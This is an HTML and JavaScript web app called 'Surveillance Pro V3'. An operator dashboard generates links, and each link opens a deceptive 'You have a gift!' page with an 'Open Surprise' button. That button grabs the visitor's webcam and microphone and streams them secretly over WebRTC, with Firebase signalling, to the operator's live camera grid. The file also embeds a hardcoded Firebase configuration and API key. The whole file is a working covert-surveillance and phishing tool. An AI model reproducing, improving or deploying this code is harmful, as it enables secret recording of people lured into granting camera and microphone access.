<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surveillance Pro V3</title>
    <style>
        :root { --bg: #0a0a0b; --panel: #16161a; --accent: #00d2ff; --red: #ff4757; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #fff; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        .sidebar { width: 300px; background: var(--panel); border-right: 1px solid #333; padding: 20px; display: flex; flex-direction: column; }
        .dashboard { flex-grow: 1; padding: 20px; overflow-y: auto; }
        .camera-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 20px; }
        .cam-slot { position: relative; background: #000; border: 2px solid #333; border-radius: 12px; overflow: hidden; aspect-ratio: 16/9; }
        video { width: 100%; height: 100%; object-fit: cover; background: #000; }
        .sync-btn { position: absolute; bottom: 10px; right: 10px; background: var(--accent); color: #000; border: none; padding: 5px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; z-index: 20; }
        #giftUI { width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #fff; color: #000; position: fixed; z-index: 10000; }
        .hidden { display: none !important; }
        input { width: 100%; background: #222; border: 1px solid #444; color: #fff; padding: 8px; margin-top: 10px; font-size: 11px; }
        button#genBtn { background: var(--accent); color: #000; border: none; padding: 12px; width: 100%; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>

    <div id="giftUI" class="hidden">
        <h1>üéÅ You have a gift!</h1>
        <button style="background:#ff4757; color:white; padding:20px 40px; border-radius:50px; border:none; font-size:20px;" onclick="activateCamera()">Open Surprise</button>
    </div>

    <div class="sidebar">
        <h3>SYSTEM COMMAND</h3>
        <button id="genBtn" onclick="generateLink()">‚ûï NEW CAMERA NODE</button>
        <input type="text" id="linkOutput" readonly placeholder="Link will appear here...">
        <div id="log" style="flex-grow: 1; background: #000; margin-top: 20px; padding: 10px; font-family: monospace; font-size: 11px; color: #0f0; border: 1px solid #333; overflow-y: auto;">[SYS] Ready...</div>
    </div>

    <div class="dashboard">
        <div class="camera-grid" id="camGrid"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, onValue, onChildAdded, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
  apiKey: "AIzaSyDdy2_v-_kTBaW1OwH6PYb-OJ0E9G25qK8",
  authDomain: "sai-chiropractic-upachar.firebaseapp.com",
  databaseURL: "https://sai-chiropractic-upachar-default-rtdb.firebaseio.com",
  projectId: "sai-chiropractic-upachar",
  storageBucket: "sai-chiropractic-upachar.firebasestorage.app",
  messagingSenderId: "25917087328",
  appId: "1:25917087328:web:372a15797238e79b3aed05"
};

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const urlParams = new URLSearchParams(window.location.search);
        const role = urlParams.get('role');
        const roomID = urlParams.get('room');
        const connections = {};

        const iceConfig = {
            iceServers: [
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun1.l.google.com:19302" },
                { urls: "stun:stun2.l.google.com:19302" }
            ]
        };

        function sysLog(m) { const l = document.getElementById('log'); l.innerHTML += `<br>> ${m}`; l.scrollTop = l.scrollHeight; }

        if (role === 'camera') {
            document.getElementById('giftUI').classList.remove('hidden');
            window.activateCamera = async () => {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480, frameRate: 15 }, 
                    audio: true 
                });
                const pc = new RTCPeerConnection(iceConfig);
                stream.getTracks().forEach(t => pc.addTrack(t, stream));
                pc.onicecandidate = (e) => { if(e.candidate) push(ref(db, `rooms/${roomID}/camera/ice`), JSON.stringify(e.candidate)); };
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                set(ref(db, `rooms/${roomID}/camera/offer`), JSON.stringify(offer));
                onValue(ref(db, `rooms/${roomID}/monitor/answer`), (s) => { if(s.val()) pc.setRemoteDescription(new RTCSessionDescription(JSON.parse(s.val()))); });
            };
        } else {
            window.generateLink = () => {
                const id = "NODE_" + Math.random().toString(36).substring(7).toUpperCase();
                document.getElementById('linkOutput').value = `${window.location.origin}${window.location.pathname}?role=camera&room=${id}`;
            };
            onChildAdded(ref(db, 'rooms'), (snap) => { if(!connections[snap.key]) startMonitoring(snap.key); });
        }

        async function startMonitoring(id) {
            const pc = new RTCPeerConnection(iceConfig);
            connections[id] = pc;
            
            const grid = document.getElementById('camGrid');
            grid.insertAdjacentHTML('beforeend', `<div class="cam-slot" id="s_${id}"><video id="v_${id}" autoplay playsinline muted></video><button class="sync-btn" onclick="document.getElementById('v_${id}').play()">RE-SYNC</button></div>`);
            
            pc.ontrack = (e) => {
                const v = document.getElementById(`v_${id}`);
                v.srcObject = e.streams[0];
                v.play().catch(() => sysLog(`Autoplay blocked for ${id}. Click RE-SYNC.`));
            };

            onValue(ref(db, `rooms/${id}/camera/offer`), async (s) => {
                const d = s.val();
                if(d && !pc.currentRemoteDescription) {
                    await pc.setRemoteDescription(new RTCSessionDescription(JSON.parse(d)));
                    const a = await pc.createAnswer();
                    await pc.setLocalDescription(a);
                    set(ref(db, `rooms/${id}/monitor/answer`), JSON.stringify(a));
                }
            });

            onChildAdded(ref(db, `rooms/${id}/camera/ice`), (s) => { if(s.val()) pc.addIceCandidate(new RTCIceCandidate(JSON.parse(s.val()))).catch(()=>{}); });
        }
    </script>
</body>
</html>
